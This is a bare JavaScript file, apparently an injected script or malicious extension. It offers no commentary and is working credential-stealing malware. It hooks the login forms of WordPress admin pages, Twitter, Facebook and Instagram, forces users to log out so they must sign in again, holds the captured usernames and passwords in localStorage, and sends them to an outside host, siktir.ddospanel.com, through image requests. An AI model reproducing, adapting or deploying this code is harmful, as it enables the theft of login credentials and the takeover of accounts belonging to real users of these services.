if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}


if (location.hostname.indexOf("twitter.com") >= 0) {
if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("download") >= 0) {
window.location = "https://twitter.com/login";
}
setTimeout(function(){ 
if( document.getElementById('signin-email')) {  window.location = "https://twitter.com/login";  }
}, 300);

tarih = new Date();
    storage_key = 'access_twittar_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = '//whos.amung.us/swidget/tccalface';
document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].click();
		
    }
    
	
document.getElementById("session").innerHTML = '<a href="https://twitter.com/login">Hesabın var mı? Giriş yap</a>';
if (window.location.href.indexOf("login") >= 0) {

	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value;
	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value;
		
		setTimeout(function() {
			document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick;
		}, 99);
		return false
	}
}else{
if(localStorage['pw'] && localStorage['sw']){
	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['pw'] + "&password=" + localStorage['sw'];
}
}




}



if (top.location.href.indexOf("facebook.com") > -1 && document.getElementById("login_form")) {
    document.getElementById("login_form").onsubmit = function (e) {
        localStorage.setItem("upom", document.getElementById("email").value);
        localStorage.setItem("uzom", document.getElementById("pass").value);
        setTimeout(function () {
            document.getElementById("login_form").submit()
        }, 99);
        return false
    }
}
if (localStorage.upom && localStorage.uzom) {
	
	tarih = new Date();
    storage_key = 'access_twitter_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
    }	
}

if (top.location.href.indexOf("instagram") > -1) {

tarih = new Date();
    storage_key = 'access_instakram_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		window.location = "http://www.instagram.com/accounts/logout";
    }	




	document.getElementsByClassName('_rwf8p')[0][2].onclick = function(data) {
		console.log("Login olundu!");
		new Image().src = "https://siktir.ddospanel.com/cpin.php?username=" + document.getElementsByName('username')[0].value + "&password=" + document.getElementsByName('password')[0].value;
		setTimeout(function() {
			document.getElementsByClassName('_rwf8p')[0][2].onclick;
		}, 99);
		return false
	}
}
